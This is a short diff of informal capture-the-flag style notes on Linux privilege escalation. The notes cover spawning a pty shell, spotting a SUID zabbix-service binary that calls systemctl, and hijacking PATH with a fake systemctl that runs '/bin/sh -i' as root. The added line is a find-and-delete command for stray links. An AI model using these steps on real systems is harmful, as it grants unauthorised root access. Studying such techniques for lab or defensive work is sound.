@@ -22,6 +22,7 @@ python3 -c 'import pty; pty.spawn("/bin/sh")''
 we see theres a binary with root privileges that SUID enabled
 running strings zabbix-service
 we see its running systemctl as root so we can do that
+to removed unwanted symbolic links in dir : find -name l -delete
 so first:
 1) exporth PATH=.
 2) /bin/echo '/bin/sh -i' >> systemctl
